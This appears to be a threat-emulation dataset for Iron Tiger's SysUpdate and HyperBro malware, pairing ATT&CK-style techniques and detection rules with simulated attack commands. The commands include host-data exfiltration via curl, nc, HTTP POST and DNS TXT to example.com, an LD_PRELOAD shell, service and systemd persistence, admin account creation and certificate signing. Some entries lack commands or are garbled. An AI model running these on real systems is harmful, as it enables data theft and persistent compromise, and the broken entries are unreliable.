extracted_ttps.description: The attacker uses a legitimate executable to load a malicious DLL, which then loads a malicious binary file in memory.

extracted_ttps.technique_name: Exfiltration Over Command and Control Channel
extracted_ttps.description: The malware sends information about the compromised computer to the C&C, including the GUID, host name, username, and local IP address
The malware collects data from the local system, including the processor architecture, current process ID, and local IP address.
The malware retrieves information about the infected machine, including the hostname, domain name, username, and operating system version.
The malware ensures persistence by copying a script to the /usr/lib/systemd/system/ directory and creating a symlink to this file in the /etc/system/system/multi-user.target.wants/ directory
The malware is executed by the user, either by running the malicious executable or by exploiting a vulnerability in a legitimate application.
The threat actor uses malicious tools and malware, such as HyperBro samples, which can be executed by users, potentially leading to infection
The malware uses a hardcoded key and DES CBC algorithm to encrypt the data sent to the C&C
The threat actor used a chat application as a lure to entice the victim into opening the malicious file
The malware may use DNS tunneling to communicate with the C&C, which could be used for phishing or other initial access techniques
The threat actor used a custom Chrome password and cookie grabber, which may utilize command and scripting interpreters
The malware uses DNS TXT requests to communicate with the C&C server, potentially allowing for lateral movement.
The malware requires root privileges to ensure persistence, suggesting that it may exploit vulnerabilities to escalate privileges
The malware retrieves information about the compromised computer, including the kernel version and machine architecture
The malware uses registry modifications to achieve persistence, although the specific registry keys are not mentioned
The malware creates a registry key to launch the malicious executable during the next reboot.
Iron Tiger's SysUpdate malware may use evasion techniques to avoid detection by security solutions

extracted_ttps.technique_name: Exfiltration Over Command and Control Channel
extracted_ttps.description: The malware sends the collected information to the C&C server using DNS TXT requests.
The malware creates a new service to launch the malicious executable during the next reboot.
The threat actor used a stolen certificate to sign malicious code, masquerading as legitimate software
The threat actor uses a stolen Cheetah certificate to sign HyperBro samples, potentially evading detection
The malware decrypts saved passwords and cookies, indicating the use of unsecured credentials
Iron Tiger's SysUpdate malware is transferred to the system, potentially through a network connection
Iron Tiger's SysUpdate malware is executed on the system, potentially by a user
The threat actor may use phishing or other social engineering tactics to deliver HyperBro samples to targeted organizations
Iron Tiger's SysUpdate malware may be delivered through phishing emails or other social engineering tactics

rules.title: DLL Side-Loading Detection
rules.description: Detects the use of legitimate executables to load malicious DLLs, which then load malicious binary files in memory, as part of the Defense Evasion tactic.
falsepositives: Legitimate use of rc.exe or INISafeWebSSO.exe in software development
Use of inicore_v2.3.30.dll in specific business applications

rules.title: Detection: Exfiltration Over Command and Control Channel
rules.description: The malware sends information about the compromised computer to the C&C, including the GUID, host name, username, and local IP address

rules.title: Remote Services via DNS TXT Requests
rules.description: Detects potential lateral movement via DNS TXT requests to C&C servers

attacks.description: Copies control.exe and a benign version.dll to TEMP, then executes control.exe to demonstrate DLL search order hijacking.
attacks.expected_behavior: Control.exe executes from TEMP directory, attempting to load version.dll from the same folder. Triggers detection for DLL search order hijacking.

attacks.command:
powershell -Command "$d = Join-Path $env:TEMP 'test'; mkdir $d -ErrorAction SilentlyContinue; Copy-Item C:\Windows\System32
otepad.exe $d
otepad.exe; Set-Content $d
otepad.dll 'benign'; Start-Process $d
otepad.exe"
attacks.description: Uses PowerShell to create directory, copy notepad.exe, create a benign notepad.dll, and execute to simulate DLL placement.
attacks.expected_behavior: Notepad.exe executes from test directory with dummy DLL, demonstrating side-loading file structure without actual payload execution.

attacks.command: md %TEMP%\adv_test && copy C:\Windows\System32\svchost.exe %TEMP%\adv_test\ && echo benign > %TEMP%\adv_test\version.dll && sc create AdvService binPath= "%TEMP%\adv_test\svchost.exe" start= demand && sc start AdvService
attacks.description: Creates a service using copied svchost.exe and benign version.dll for elevated side-loading demonstration.
attacks.expected_behavior: Service starts svchost.exe from TEMP, attempting to load version.dll. Highlights service-based DLL loading requiring admin rights.

attacks.command: gcc -shared -o malicious.so -fPIC malicious.c; gcc -o legitimate legitimate.c; LD_PRELOAD=./malicious.so ./legitimate
attacks.description: Compile a malicious shared library and a legitimate binary, then use LD_PRELOAD to load the malicious library before running the legitimate executable.
attacks.expected_behavior: The malicious shared library is loaded, and its code is executed when the legitimate binary runs, demonstrating DLL Side-Loading on Linux.

attacks.command: echo 'void __attribute__((constructor)) init(void) { system("/bin/bash"); }' > malicious.c; gcc -shared -o malicious.so -fPIC malicious.c; gcc -o legitimate legitimate.c; LD_PRELOAD=./malicious.so ./legitimate
attacks.description: Create a malicious shared library that executes a shell when loaded, compile a legitimate binary, and then use LD_PRELOAD to load the malicious library before running the legitimate executable.
attacks.expected_behavior: A shell is opened when the legitimate binary is executed, demonstrating the execution of malicious code through DLL Side-Loading on Linux.

attacks.description: Compile a malicious shared library, copy a legitimate executable (like ls) to the current directory, and then use LD_PRELOAD to load the malicious library before running the copied executable.
attacks.expected_behavior: The malicious shared library is loaded, and its code is executed when the legitimate ls binary runs, demonstrating DLL Side-Loading on Linux without compiling a custom legitimate binary.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.command: cmd.exe /c "(reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography /v MachineGuid & echo Host: %COMPUTERNAME% & echo User: %USERNAME% & ipconfig | findstr IPv4) > %TEMP%\data.txt & powershell -Command Invoke-WebRequest -Uri http://test.example.com/exfil -Method POST -InFile %TEMP%\data.txt & del %TEMP%\data.txt"
attacks.description: Collects system GUID, hostname, user, and IP via cmd, writes to temp file, and exfiltrates via HTTP POST using PowerShell.
attacks.expected_behavior: Creates temporary file with system info, sends data to test domain via HTTP, deletes temp file.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.command: cmd.exe /c "reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography /v MachineGuid > %TEMP%\guid.txt & hostname > %TEMP%\host.txt & whoami > %TEMP%\user.txt & ipconfig | findstr IPv4 > %TEMP%\ip.txt & certutil -encode %TEMP%\guid.txt %TEMP%\guid.b64 & certutil -encode %TEMP%\host.txt %TEMP%\host.b64 & certutil -encode %TEMP%\user.txt %TEMP%\user.b64 & certutil -encode %TEMP%\ip.txt %TEMP%\ip.b64 & type %TEMP%\guid.b64 %TEMP%\host.b64 %TEMP%\user.b64 %TEMP%\ip.b64 > %TEMP%\combined.b64 & powershell -Command Invoke-WebRequest -Uri http://example.com/exfil -Method POST -InFile %TEMP%\combined.b64; Remove-Item %TEMP%\guid.txt, %TEMP%\host.txt, %TEMP%\user.txt, %TEMP%\ip.txt, %TEMP%\guid.b64, %TEMP%\host.b64, %TEMP%\user.b64, %TEMP%\ip.b64, %TEMP%\combined.b64 -ErrorAction SilentlyContinue"
attacks.description: Encodes collected system info with certutil before exfiltration via HTTP POST.
attacks.expected_behavior: Encodes each data field with Base64, combines into single file, sends via HTTP, cleans up temp files.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.description: Advanced exfiltration using PowerShell to format data as JSON and send via HTTPS.
attacks.expected_behavior: Collects system info, formats as JSON, and exfiltrates via HTTPS POST to simulate encrypted C&C traffic.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.command: curl -X POST -d "guid=$(uuidgen)&hostname=$(hostname)&username=$(whoami)&ip=$(ip addr show | grep "inet " | awk '{print $2}' | cut -d/ -f1)" http://example.com/c2
attacks.description: Basic command to exfiltrate system information to a C&C server using curl
attacks.expected_behavior: The command sends a POST request to the specified URL with the system's GUID, hostname, username, and local IP address.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.command: wget --post-data "guid=$(uuidgen)&hostname=$(hostname)&username=$(whoami)&ip=$(ip addr show | grep "inet " | awk '{print $2}' | cut -d/ -f1)" -q -O - http://example.com/c2
attacks.description: Intermediate command to exfiltrate system information to a C&C server using wget
attacks.expected_behavior: The command sends a POST request to the specified URL with the system's GUID, hostname, username, and local IP address.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.command: echo "guid=$(uuidgen)&hostname=$(hostname)&username=$(whoami)&ip=$(ip addr show | grep "inet " | awk '{print $2}' | cut -d/ -f1)" | nc example.com 8080
attacks.description: Advanced command to exfiltrate system information to a C&C server using netcat
attacks.expected_behavior: The command sends the system's GUID, hostname, username, and local IP address to the specified server and port using netcat.

attacks.command: wmic os get osarchitecture & ipconfig | findstr IPv4
attacks.description: Collects processor architecture and local IPv4 addresses using WMIC and ipconfig
attacks.expected_behavior: Outputs OS architecture (e.g., 64-bit) and all IPv4 addresses via console

attacks.command: powershell -Command "Get-WmiObject Win32_OperatingSystem | Select-Object OSArchitecture; Write-Output 'Process ID: $PID'; Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress"
attacks.description: Uses PowerShell to retrieve OS architecture, current process ID, and IPv4 addresses
attacks.expected_behavior: Displays OS architecture, current PowerShell process ID, and IPv4 addresses in console

attacks.command: echo Processor Architecture: > %TEMP%\sysinfo.txt && wmic os get osarchitecture >> %TEMP%\sysinfo.txt && echo Process ID: >> %TEMP%\sysinfo.txt && tasklist /FI "IMAGENAME eq cmd.exe" /FO TABLE >> %TEMP%\sysinfo.txt && ipconfig | findstr IPv4 >> %TEMP%\sysinfo.txt && certutil -encode %TEMP%\sysinfo.txt %TEMP%\sysinfo.b64
attacks.description: Aggregates system info into a file, encodes it with certutil
attacks.expected_behavior: Creates sysinfo.txt with collected data, encodes to Base64 as sysinfo.b64 in TEMP directory

attacks.description: Collects information about the system, including processor architecture
attacks.expected_behavior: Displays system information, including processor architecture

attacks.description: Collects the current process ID
attacks.expected_behavior: Displays the current process ID

attacks.description: Collects the local IP address
attacks.expected_behavior: Displays the local IP address

attacks.description: Retrieve the hostname of the machine
attacks.expected_behavior: The command will output the hostname of the machine

attacks.description: Retrieve the username and domain name
attacks.expected_behavior: The command will output the username and domain name

attacks.description: Retrieve the operating system version
attacks.expected_behavior: The command will output the operating system version and other system information

attacks.description: Retrieves hostname, domain name, username, and operating system version.
attacks.expected_behavior: Displays the hostname, domain name, current username, and operating system version.

attacks.description: Retrieves detailed operating system information, user ID, and hostname details.
attacks.expected_behavior: Displays detailed information about the operating system, user ID, and hostname.

attacks.description: Retrieves the current username, hostname, and detailed operating system release information.
attacks.expected_behavior: Displays the current username, hostname, and detailed operating system release information.

attacks.description: Copies a benign file to the user's Startup folder for persistence.
attacks.expected_behavior: The file is copied to the user's Startup directory, causing it to execute on subsequent logins.

attacks.command: cmd.exe /c echo ping 127.0.0.1 > "%TEMP%\dummy.bat" && schtasks /create /tn "SystemUpdate" /tr "%TEMP%\dummy.bat" /sc onlogon /ru SYSTEM /f
attacks.description: Creates a scheduled task that runs a benign batch file on user login.
attacks.expected_behavior: The task is created and executes the batch file at logon, simulating persistence via task scheduling.

attacks.command: cmd.exe /c echo benign > "%TEMP%\payload.vbs" && copy /Y "%TEMP%\payload.vbs" "C:\Windows\System32\payload.vbs" && mklink "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\payload-link.vbs" "C:\Windows\System32\payload.vbs"
attacks.description: Copies a benign script to System32 and creates a symlink in the all-users Startup folder.
attacks.expected_behavior: The script is placed in System32 and symlinked to the Startup directory, ensuring execution on login.

attacks.command:
echo '#!/bin/bash
/bin/echo "Test Persistence" > /tmp/persistence_test.txt' > persistence_script.sh; chmod +x persistence_script.sh; sudo cp persistence_script.sh /usr/lib/systemd/system/; sudo ln -s /usr/lib/systemd/system/persistence_script.sh /etc/systemd/system/multi-user.target.wants/persistence_script.service
attacks.description: Creates a simple bash script that writes a test string to a file, makes it executable, copies it to the systemd directory, and creates a symlink to it in the multi-user target wants directory to simulate persistence.
attacks.expected_behavior: The script will be executed when the multi-user target is reached, writing 'Test Persistence' to /tmp/persistence_test.txt, demonstrating persistence.

attacks.command:
sudo bash -c 'echo "[Unit]
Description=Test Persistence Service
[Service]
ExecStart=/usr/bin/echo "Test Persistence" > /tmp/persistence_test.txt
[Install]
WantedBy=multi-user.target" > /etc/systemd/system/test_persistence.service; sudo systemctl daemon-reload; sudo systemctl enable test_persistence.service'
attacks.description: Creates a systemd service file directly, which when enabled and started, will execute a command that writes a test string to a file, simulating persistence without needing to create and copy a separate script file.
attacks.expected_behavior: Upon reaching the multi-user target, the test_persistence service will be started, writing 'Test Persistence' to /tmp/persistence_test.txt, demonstrating persistence.

attacks.command:
echo '#!/bin/bash
/bin/echo "Advanced Test Persistence" > /tmp/advanced_persistence_test.txt' > advanced_persistence_script.sh; chmod +x advanced_persistence_script.sh; sudo cp advanced_persistence_script.sh /usr/lib/systemd/system/; sudo ln -s /usr/lib/systemd/system/advanced_persistence_script.sh /etc/systemd/system/multi-user.target.wants/advanced_persistence_script.service; sudo systemctl daemon-reload
attacks.description: An advanced version of the first command, including an additional step to reload the systemd daemon after creating the service symlink, ensuring the new service file is recognized by the system without needing a reboot.
attacks.expected_behavior: The advanced_persistence_script will be executed when the multi-user target is reached, writing 'Advanced Test Persistence' to /tmp/advanced_persistence_test.txt, demonstrating advanced persistence techniques.

attacks.description: Basic: User executes batch file from decoded payload
attacks.expected_behavior: Decodes test.txt to test.bat in TEMP and executes it (test.bat could contain benign commands like calc.exe)

attacks.description: Intermediate: User runs downloaded executable via PowerShell
attacks.expected_behavior: Executes report.exe from Downloads folder with silent flag (substitute with calc.exe for testing)

attacks.command: cmd /c echo MsgBox "Document opened successfully" > %TEMP%\alert.vbs && wscript %TEMP%\alert.vbs
attacks.description: Advanced: User executes VBS script masquerading as document
attacks.expected_behavior: Creates and runs VBS script showing fake success message box

attacks.description: Basic example of a user executing a malicious script
attacks.expected_behavior: The script will execute with the user's privileges

attacks.description: Intermediate example of a user executing malicious code using bash
attacks.expected_behavior: A file named malicious_file.txt will be created in the /tmp directory

attacks.description: Advanced example of a user executing malicious code using python
attacks.expected_behavior: The python code will execute and print malicious_code to /dev/null

attacks.command: powershell -Command "$key = [System.Text.Encoding]::UTF8.GetBytes('SecretKey'); $des = New-Object System.Security.Cryptography.DESCryptoServiceProvider; $des.Mode = [System.Security.Cryptography.CipherMode]::CBC; $encryptor = $des.CreateEncryptor($key, $key); $ms = New-Object System.IO.MemoryStream; $cs = New-Object System.Security.Cryptography.CryptoStream($ms, $encryptor, [System.Security.Cryptography.CryptoStreamMode]::Write); $sw = New-Object System.IO.StreamWriter($cs); $sw.Write('test_data'); $sw.Close(); $encrypted = [System.Convert]::ToBase64String($ms.ToArray()); Invoke-WebRequest -Uri 'http://example.com' -Method Post -Body $encrypted -ErrorAction SilentlyContinue"
attacks.description: Encrypts test string with DES CBC using hardcoded key and POSTs to example.com
attacks.expected_behavior: Encrypts 'test_data' with DES CBC (key=SecretKey), base64 encodes, and sends via HTTP POST to example.com

attacks.command: powershell -Command "$tempFile = Join-Path $env:TEMP 'encrypted.bin'; $key = [System.Text.Encoding]::UTF8.GetBytes('SecretKey12345678'); $des = New-Object System.Security.Cryptography.DESCryptoServiceProvider; $des.Mode = [System.Security.Cryptography.CipherMode]::CBC; $encryptor = $des.CreateEncryptor($key, $key); $bytes = [System.Text.Encoding]::UTF8.GetBytes('test_data'); $encrypted = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length); [System.IO.File]::WriteAllBytes($tempFile, $encrypted); certutil -encode $tempFile $env:TEMP\encoded.txt > nul; $b64 = Get-Content $env:TEMP\encoded.txt -Raw; Invoke-WebRequest -Uri 'http://example.com' -Method Post -Body $b64 -ErrorAction SilentlyContinue; Remove-Item $tempFile, $env:TEMP\encoded.txt -ErrorAction SilentlyContinue"
attacks.description: Encrypts data, writes to temp file, certutil encodes, sends via POST
attacks.expected_behavior: Encrypts data with DES CBC, base64 encodes via certutil, sends to example.com, cleans temp files

attacks.command: powershell -Command "$keyStr = 'SecretKey'; $sha = New-Object System.Security.Cryptography.SHA1CryptoServiceProvider; $key = $sha.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($keyStr))[0..7]; $des = New-Object System.Security.Cryptography.DESCryptoServiceProvider; $des.Mode = [System.Security.Cryptography.CipherMode]::CBC; $iv = New-Object byte[] 8; $rng = New-Object System.Security.Cryptography.RNGCryptoServiceProvider; $rng.GetBytes($iv); $encryptor = $des.CreateEncryptor($key, $iv); $data = [System.Text.Encoding]::UTF8.GetBytes('test_data'); $encrypted = $encryptor.TransformFinalBlock($data, 0, $data.Length); $result = $iv + $encrypted; $b64 = [System.Convert]::ToBase64String($result); Invoke-WebRequest -Uri 'http://example.com' -Method Post -Body $b64 -ErrorAction SilentlyContinue"
attacks.description: Advanced DES CBC with SHA1 key derivation and random IV
attacks.expected_behavior: Derives 8-byte key via SHA1 hash, generates random IV, encrypts data with DES CBC, sends IV+payload to example.com

attacks.description: Encrypt a test message using a hardcoded key and the DES CBC algorithm
attacks.expected_behavior: The command will encrypt the test message and save it to a file named encrypted.txt

attacks.description: Decrypt the encrypted message using the same hardcoded key and the DES CBC algorithm
attacks.expected_behavior: The command will decrypt the encrypted message and save it to a file named decrypted.txt

attacks.command: echo 'Test message' > /tmp/test.txt; openssl enc -des-cbc -K 0123456789abcdef -iv 01234567 -e -in /tmp/test.txt -out /tmp/encrypted.txt; cat /tmp/encrypted.txt | base64
attacks.description: Create a test message, encrypt it using a hardcoded key and the DES CBC algorithm, and then encode the encrypted message in Base64
attacks.expected_behavior: The command will create a test message, encrypt it, and then encode the encrypted message in Base64, which can be sent to a C&C server

attacks.description: Basic DNS TXT record lookup to a suspicious domain
attacks.expected_behavior: Triggers a DNS query for TXT record of test.example.com, simulating C2 communication.

attacks.description: Intermediate PowerShell DNS query with Base64-encoded test string in subdomain
attacks.expected_behavior: Sends a DNS TXT query with encoded data in the subdomain, mimicking tunneling.

attacks.description: Advanced scheduled task for daily DNS lookups to a suspicious domain
attacks.expected_behavior: Creates a scheduled task to perform daily DNS queries, simulating persistent C2 communication.

attacks.command: echo 'Subject: Test Phishing Email' > phishing_email.txt; echo 'This is a test phishing email' >> phishing_email.txt; mail -s 'Test Phishing Email' user@example.com < phishing_email.txt
attacks.description: Basic phishing email simulation using the 'mail' command
attacks.expected_behavior: Sends a benign phishing email to the specified user

attacks.command: curl -X GET 'http://example.com/phishing_page' -o phishing_page.html; echo 'Phishing page saved to phishing_page.html'
attacks.description: Intermediate phishing simulation using 'curl' to download a phishing page
attacks.expected_behavior: Downloads a benign phishing page and saves it to a file

attacks.command: dig +short example.com | xargs -I {} echo 'Phishing DNS query: {}' >> phishing_dns.log
attacks.description: Advanced phishing simulation using 'dig' and 'xargs' to simulate DNS tunneling
attacks.expected_behavior: Simulates a DNS tunneling scenario and logs the results to a file

attacks.description: Basic command to create a text file using cmd.exe
attacks.expected_behavior: A text file named test.txt will be created in the temp directory with the content 'Hello World'

attacks.description: Intermediate command to display a message box using powershell.exe
attacks.expected_behavior: A message box will be displayed with the content 'Hello World'

attacks.command: cmd.exe /c mkdir "C:\Path" -ErrorAction SilentlyContinue && echo Test > C:\Path\test.txt

attacks.expected_behavior: A directory named Path will be created in the root directory and a text file named test.txt will be created inside it with the content 'Test'

attacks.description: Basic command to create a file using bash

attacks.description: Intermediate command to create and execute a script using bash

attacks.command: bash -c 'sudo bash -c "echo "Test Command with Elevated Privileges" > /root/test.txt"'
attacks.description: Advanced command to create a file using bash with elevated privileges
attacks.expected_behavior: Creates a file named test.txt in the /root directory with the content 'Test Command with Elevated Privileges' using elevated privileges

attacks.description: Basic DNS TXT query to C2 server
attacks.expected_behavior: Performs single DNS TXT record lookup for 'test.example.com'. Output shows TXT record response if present.

attacks.description: Intermediate periodic TXT record polling
attacks.expected_behavior: Continuously checks TXT records every 60 seconds. Runs until interrupted, simulating persistent C2 channel.

attacks.command: cmd /c "echo test > %TEMP%\test.txt && certutil -encode %TEMP%\test.txt %TEMP%\test.b64 > nul && powershell -Command \"(Get-Content %TEMP%\test.b64) -replace '[^a-zA-Z0-9]','' | Select-String -Pattern '\w{50}' -AllMatches | ForEach-Object { $_.Matches.Value } | ForEach-Object { nslookup -type=TXT $_.test.example.com }\""
attacks.description: Advanced data exfiltration via chunked TXT queries
attacks.expected_behavior: Encodes test file to base64, splits into 50-character chunks, and queries each as TXT subdomain. Demonstrates data exfiltration pattern.

attacks.description: Simulate a DNS TXT request to a hypothetical C&C server using the dig command.
attacks.expected_behavior: The command queries the DNS TXT record for example.com and displays the result, simulating communication with a C&C server without actually establishing a connection.

attacks.description: Encode a simulated malicious payload using Base64, which could be used in a DNS TXT request.
attacks.expected_behavior: The command encodes a benign string into Base64, demonstrating how a malicious payload could be encoded for transmission via DNS TXT requests.

attacks.description: Simulate receiving a DNS TXT response and writing it to a file, demonstrating potential lateral movement.
attacks.expected_behavior: The command queries the DNS TXT record for example.com, pipes the output to xargs, which executes a shell command to write the output to a file named simulated_output.txt in /tmp, simulating the handling of received commands or data.

attacks.command: sc.exe create TestService binPath= "cmd.exe /c echo test > %TEMP%\test.txt" start= auto obj= LocalSystem
attacks.description: Creates a new auto-start service running as LocalSystem
attacks.expected_behavior: Service creation succeeds but may fail to start due to invalid binary path. Demonstrates service-based privilege escalation vector.

attacks.command: schtasks /create /tn "TestTask" /tr "cmd.exe /c echo test > %TEMP%\test.txt" /sc once /st 00:00 /ru SYSTEM /rl HIGHEST /sd 01/01/2023 /ed 01/01/2023 && schtasks /run /tn "TestTask"
attacks.description: Creates and triggers scheduled task running as SYSTEM
attacks.expected_behavior: Task executes specified command with SYSTEM privileges. Cleanup requires manual task deletion.

attacks.command: sc config ALG binPath= "cmd.exe /c echo test > %TEMP%\test.txt" && sc stop ALG && sc start ALG
attacks.description: Modifies existing service binary path to execute benign command
attacks.expected_behavior: Service configuration changed and restarted. May disrupt ALG service functionality until reverted.

attacks.description: Basic attempt to write exploit code to a file using sudo, assuming the user has sudo privileges.
attacks.expected_behavior: Writes a file named 'exploit' in /tmp with the content 'exploit_code', demonstrating potential for exploiting vulnerabilities.

attacks.description: Intermediate attempt using pkexec to execute bash with elevated privileges, writing exploit code to a file.
attacks.expected_behavior: Similar to the basic attempt but uses pkexec, which is another way to execute commands with elevated privileges.

attacks.description: Advanced attempt using Python to execute a system command that writes exploit code to a file, leveraging sudo for elevation.
attacks.expected_behavior: Executes a Python command that uses the os module to write 'exploit_code' to /tmp/exploit, demonstrating a more complex exploitation method.

attacks.command: reg add HKCU\Software\Test /v TestValue /t REG_SZ /d TestData /f
attacks.description: Create a new registry key and value
attacks.expected_behavior: A new registry key and value will be created

attacks.description: Modify an existing registry key to achieve persistence
attacks.expected_behavior: The registry key will be modified to run cmd.exe on startup

attacks.description: Create a new registry key and value using PowerShell
attacks.expected_behavior: A new registry key and value will be created

attacks.description: Modify a system configuration file to simulate registry modification.
attacks.expected_behavior: Creates a new file in /etc/ directory with 'test_string' content, simulating a registry key modification.

attacks.description: Create a symbolic link to mimic a registry modification for persistence.
attacks.expected_behavior: Creates a symbolic link in /usr/local/bin/ that points to /bin/true, simulating a persistence mechanism through registry modification.

attacks.description: Modify the GRUB configuration file to simulate a registry key modification for persistence.
attacks.expected_behavior: Replaces 'old_string' with 'test_string' in the GRUB configuration file, simulating a registry modification for persistence purposes.

attacks.description: Check for running virtualization processes (VMware Tools, VirtualBox)
attacks.expected_behavior: Outputs any matching processes indicating virtualization environment

attacks.description: Calculate system uptime in hours to detect short-lived sandboxes
attacks.expected_behavior: Outputs uptime duration; sandboxes often show <24 hours uptime

attacks.command: sc query VBoxService > nul 2>&1 && echo Detected > %TEMP%\evasion_marker.txt
attacks.description: Detect VirtualBox service and create evasion marker file
attacks.expected_behavior: Creates %TEMP%\evasion_marker.txt if VirtualBox service is present

attacks.description: Gather system information to potentially identify virtualization or sandbox environments
attacks.expected_behavior: Output system information, including kernel version and CPU details, which could be used to determine the environment type

attacks.description: Use dmidecode to retrieve the system product name, which might indicate a virtual machine
attacks.expected_behavior: Output the system product name, potentially revealing if it's a known virtual machine product

attacks.description: Check for VMware-specific device files, indicating a virtualized environment
attacks.expected_behavior: List device files related to VMware, if present, suggesting the system is virtualized

attacks.command: certutil -addstore Root "%TEMP%\test_cert.cer" && powershell -Command "$cert = Get-ChildItem Cert:\LocalMachine\Root | Where-Object { $_.Subject -like '*Test*' } | Select-Object -First 1; Set-AuthenticodeSignature -FilePath '%TEMP%\harmless.dll' -Certificate $cert -ErrorAction SilentlyContinue"
attacks.description: Import stolen certificate into Root store and sign a benign DLL
attacks.expected_behavior: Imports the certificate into the Trusted Root store and signs harmless.dll, making it appear trusted. Requires admin for certificate store modification.

attacks.description: Sign a PowerShell script with stolen PFX certificate
attacks.expected_behavior: Signs test.ps1 using the PFX certificate without importing it, making the script appear legitimate.

attacks.command: powershell -Command "Set-Content -Path '%TEMP%\test.ps1' -Value 'Write-Host "Benign script"' -Force; $pass = ConvertTo-SecureString 'Test123' -AsPlainText -Force; $cert = Get-PfxCertificate -FilePath '%TEMP%\test.pfx' -Password $pass; Set-AuthenticodeSignature -FilePath '%TEMP%\test.ps1' -Certificate $cert -ErrorAction SilentlyContinue; & '%TEMP%\test.ps1'"
attacks.description: Create, sign, and execute a benign script with stolen PFX
attacks.expected_behavior: Creates a script, signs it with the stolen certificate, and executes it, demonstrating execution of masqueraded code.

attacks.description: Generate a self-signed certificate to potentially masquerade as a legitimate service or software.
attacks.expected_behavior: Creates a self-signed certificate and key in the current directory.

attacks.description: Copy and modify a system certificate to masquerade malicious activities.
attacks.expected_behavior: Copies a system certificate to the user's home directory and attempts to create a dummy certificate, potentially for masquerading.

attacks.description: Create a simple script that could be used to masquerade as a legitimate system script or command.
attacks.expected_behavior: Creates a basic executable script in the current directory, which could be used for masquerading purposes.

attacks.description: Lists all user accounts on the system, which could be a preliminary step in identifying where unsecured credentials might be found.
attacks.expected_behavior: Displays a list of user accounts on the system.

attacks.description: Searches the user's AppData directory for text files, which could potentially contain unsecured credentials.
attacks.expected_behavior: Lists text files in the AppData directory, potentially revealing files with unsecured credentials.

attacks.description: Lists files in the Cookies directory, which could contain saved cookies that might be decrypted by malware.
attacks.expected_behavior: Displays a list of files in the Cookies directory.

attacks.description: Accessing Chrome cookies file
attacks.expected_behavior: Displaying the contents of the Chrome cookies file

attacks.description: Simulating decryption of a base64 encoded string
attacks.expected_behavior: Decoding a base64 string to reveal a secret message

attacks.description: Accessing SSH private key file
attacks.expected_behavior: Displaying the contents of the SSH private key file

attacks.description: Using certutil to download a tool from a URL to the temp directory
attacks.expected_behavior: Downloads a file named tool.exe to the temp directory

attacks.description: Using PowerShell to download a tool from a URL to the temp directory
attacks.expected_behavior: Downloads a file named tool.exe to the temp directory

attacks.description: Using PowerShell with WebClient to download a tool from a URL to the temp directory, demonstrating an alternative method
attacks.expected_behavior: Downloads a file named tool.exe to the temp directory

attacks.description: Basic method to download a benign tool using wget
attacks.expected_behavior: The benign tool will be downloaded to /tmp/

attacks.description: Intermediate method using curl to download and make the tool executable
attacks.expected_behavior: The benign tool will be downloaded, made executable, and ready to run

attacks.description: Advanced method using a bash command to download, make executable, and execute the tool
attacks.expected_behavior: The benign tool will be downloaded, made executable, and executed

attacks.command: sc.exe create TestService binPath= "cmd.exe /c echo test" start= auto
attacks.description: Create a new service with benign command
attacks.expected_behavior: Creates TestService service set to auto-start, executing echo command

attacks.command: sc.exe config BITS binPath= "cmd.exe /c echo test"
attacks.description: Modify existing BITS service binary path
attacks.expected_behavior: Changes BITS service configuration to execute echo command on next start

attacks.description: Create system-level scheduled task triggering at startup
attacks.expected_behavior: Creates TestTask scheduled task running as SYSTEM at system startup

attacks.description: Start the SSH service using systemd
attacks.expected_behavior: The SSH service will start, allowing remote connections to the system.

attacks.description: Open the cron table for editing using the default editor
attacks.expected_behavior: The cron table will be opened for editing, allowing the user to schedule tasks.

attacks.description: Enable and start a custom service using systemd
attacks.expected_behavior: The custom service will be enabled and started, allowing it to run at boot time.

attacks.description: Base64 encode a file using certutil and delete original
attacks.expected_behavior: Creates base64-encoded version of test.txt and deletes original file

attacks.description: Execute obfuscated PowerShell command writing to TEMP directory
attacks.expected_behavior: Creates obfuscated.txt in TEMP directory via encoded PowerShell command

attacks.description: Obfuscated certutil command using variable substitution
attacks.expected_behavior: Encodes file using split certutil syntax and deletes original via variable manipulation

attacks.description: Create a file with obfuscated content using base64 encoding
attacks.expected_behavior: A file named test.txt will be created in the user's home directory with the decoded string 'Hello world!'

attacks.description: Obfuscate a file using AES encryption
attacks.expected_behavior: The file test.txt will be encrypted and saved as test.enc in the user's home directory

attacks.description: Obfuscate a file by converting it to a hexadecimal representation
attacks.expected_behavior: A file named test.hex will be created in the user's home directory with the hexadecimal representation of the original file

attacks.description: Exploit a public-facing application by downloading and executing a malicious executable from a controlled URL.
attacks.expected_behavior: Downloads and executes an executable, potentially leading to code execution.

attacks.description: Exploit a public-facing application by downloading and executing a PowerShell script.
attacks.expected_behavior: Downloads and executes a PowerShell script, potentially leading to code execution.

attacks.command: cmd.exe /c "net user /add testuser testpass && net localgroup administrators testuser /add"
attacks.description: Exploit a vulnerability in user management by adding a new user with administrative privileges.
attacks.expected_behavior: Adds a new user with administrative privileges, demonstrating privilege escalation.

attacks.description: Scanning for open ports and services on a public-facing application
attacks.expected_behavior: The command scans the target IP for open ports and identifies the services running on those ports, which can be used to exploit vulnerabilities in public-facing applications.

attacks.description: Sending a GET request to a potentially vulnerable endpoint of a public-facing application
attacks.expected_behavior: The command sends a GET request to a specified endpoint on the target IP and port, which can be used to exploit vulnerabilities such as path traversal or SQL injection in public-facing web applications.

attacks.description: Downloading and executing an exploit from a URL, simulating an advanced exploitation scenario
attacks.expected_behavior: The command downloads an exploit from a specified URL, saves it to a temporary location, makes it executable, and then executes it. This simulates an advanced exploitation scenario where an attacker gains access to a public-facing application and uses it to execute malicious code.

attacks.description: Basic command to archive all files in the Public Documents folder using PowerShell's Compress-Archive cmdlet.
attacks.expected_behavior: Archives files in the Public Documents folder into a zip file named 'archived_data.zip' in the TEMP directory.

attacks.description: Intermediate command using PowerShell to add the System.IO.Compression.FileSystem assembly and then use the ZipFile class to create a zip archive of the Public Documents folder.
